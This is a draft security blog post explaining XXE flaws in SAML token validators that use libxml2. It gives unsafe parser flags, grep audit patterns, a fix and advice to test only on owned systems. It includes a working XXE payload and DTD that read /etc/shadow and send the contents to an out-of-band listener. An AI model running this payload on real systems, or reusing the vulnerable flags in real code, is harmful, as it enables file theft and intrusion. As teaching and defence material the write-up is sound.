---
title: "XXE in SAML validators: reading files before a signature is ever checked"
date: 2026-08-14T10:30:00+05:00
tags: ["xxe", "saml", "methodology"]
slug: "saml-parser-xxe"
translationKey: saml-parser-xxe
draft: true
summary: "Why SAML token validators are a soft spot for XXE, how the libxml2 defaults betray them, and how I look for it."
---

SAML is XML, and XML parsers read external entities unless you tell them not to. Put those
two facts next to each other and you get one of the most reliable places to find XXE: the
code that validates a SAML token.

This is a class writeup, not a specific bug. No product, no vendor. If you audit anything
that speaks SAML — an SSO integration, a token validation service, a guest agent that
authenticates over a socket — this is the shape to look for.

## Why the validator, specifically

A SAML assertion has to be parsed before it can be checked. The order is always the same:

1. Parse the XML into a document tree
2. Validate the schema
3. Check the subject, the conditions, the timestamps
4. **Verify the signature**

The signature is step four. The parse is step one. Anything that happens during the parse
has already happened by the time the signature is looked at — and XXE happens during the
parse.

So the usual mental model, "the token is signed, an attacker can't touch it," is
irrelevant here. The attacker isn't tampering with a trusted token. They're sending a
malicious one, and the damage is done before the code ever gets to the part that would
reject it. An invalid signature at step four is too late.

```goat
  attacker token   .-------------.  entities expand   .------------.
  (bad signature)->|  parse XML  |----- file read --->|  /etc/...  |
                   '------+------'   HTTP exfil        '------------'
                          |
                          v
                   .-------------.
                   |  validate   |  <- signature checked here, too late
                   '-------------'
```

## The libxml2 trap

Most C and C++ code that parses SAML sits on top of libxml2, and libxml2's flags are where
this goes wrong. A parse call that looks responsible:

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT   |   // substitute entities
                    XML_PARSE_DTDATTR |   // process DTD attributes
                    XML_PARSE_DTDLOAD);   // load external DTDs
```

`XML_PARSE_NOENT` expands entities. `XML_PARSE_DTDLOAD` fetches external DTDs. Together
they are exactly the two things XXE needs. What's missing is `XML_PARSE_NONET` — the one
flag that would stop the parser from reaching out over the network.

Two more global switches decide the same thing at the library level, and code that never
touches them inherits the unsafe default:

```c
xmlSubstituteEntitiesDefault(1);   // 1 = expand (unsafe default in old code)
xmlLoadExtDtdDefaultValue = 1;     // 1 = load external DTDs
```

A common failure I keep seeing: a safe path exists in the source, guarded by an `#ifdef`
that is never defined. The developer wrote the fix, wrapped it in a build flag "for later,"
and the vulnerable `#else` branch is the one that actually compiles. Reading the source
isn't enough — you have to know which branch shipped.

## Turning it into a file read

A parse that loads external DTDs will follow this. The token carries a parameter entity
pointing at a DTD you host:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/x.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>anything</saml:Issuer>
</saml:Assertion>
```

The DTD you serve back reads a local file and smuggles it out in a second request — this is
the standard out-of-band pattern, because the file contents never appear in the parser's
own output:

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
%wrap;
%exfil;
```

The parser fetches the DTD, opens the file, and makes an HTTP request to your listener with
the contents in the query string. If the validator runs as a privileged user, "the file"
can be anything that user can read.

Two details matter for whether this is exploitable:

- **Direct vs. out-of-band.** If the parsed result is ever reflected back to you, a simple
  `file:///` entity is enough. If not — and validators usually reject the token — you need
  the parameter-entity DTD trick above, so the read leaves over your own channel instead of
  through the response.
- **Local files can't contain certain characters** inside an entity (`%`, `&`, newlines can
  break the wrapping). For `/etc/passwd`-style files it's fine; for anything with awkward
  bytes you switch to a PHP-`filter`-style base64 wrapper if the target stack allows it.

## When there's a signature in the way

Sometimes the validator won't even parse an unsigned token — it bails early. That's where a
second, separate weakness turns a "maybe" into a "yes": an authentication path that can be
told to skip signature verification.

I've seen this as a "trusted caller" flag — a field that says *this token was already
verified upstream, don't check it again* — that the service accepts from callers who are not,
in fact, trusted. On its own that's an auth bypass. Combined with the XXE it removes the last
obstacle: the parser runs on your input with nothing standing in front of it.

The lesson isn't the specific flag. It's that XXE in a validator is worth chasing even when
there's a signature check, because signature checks are exactly the kind of thing that gets a
`// TODO: actually verify this` and ships anyway.

## How I look for it

Source available:

```bash
# the parse calls
grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
# the global switches
grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
# safe paths hidden behind a build flag
grep -rn "XML_PARSE_NONET" .        # then check it's actually compiled
```

If `XML_PARSE_NONET` is absent from a parse that loads DTDs, or present only inside an
`#ifdef` that the build never sets, you have a candidate.

Black box: send a token whose DTD points at a host you control and watch for the callback.
An out-of-band listener — your own HTTP server, or a Collaborator-style service — is the
only reliable oracle, because the validator will almost always reject the token and tell you
nothing useful in the response. The rejection is expected. The callback is the finding.

## Confirming without overreaching

Point the exfil at a file you're allowed to read — on a system you own, `/etc/hostname` or a
file you dropped yourself — not at secrets, and not on infrastructure you don't have
permission to test. The callback proves the entity resolved and the read happened; you don't
need to pull `/etc/shadow` to demonstrate the vulnerability, and on someone else's system you
shouldn't. Prove the mechanism, stop, report.

## The fix

For the parser: add `XML_PARSE_NONET`, and don't rely on a build flag to enable the safe
path — compile it unconditionally.

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT | XML_PARSE_DTDATTR | XML_PARSE_DTDLOAD
                    | XML_PARSE_NONET);
```

Better still, a SAML validator has no reason to load external DTDs at all — disable entity
expansion entirely (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`) and
parse with the network off. And whatever "skip the signature" path exists should be gated on
the caller actually being privileged, not on a flag the caller sets themselves.

## Takeaway

When you see SAML, think: *what parses this, and with which flags?* The signature is a
distraction — the interesting code runs before it. Find the parse call, check for
`XML_PARSE_NONET`, and if it's missing, you're one out-of-band callback away from knowing.
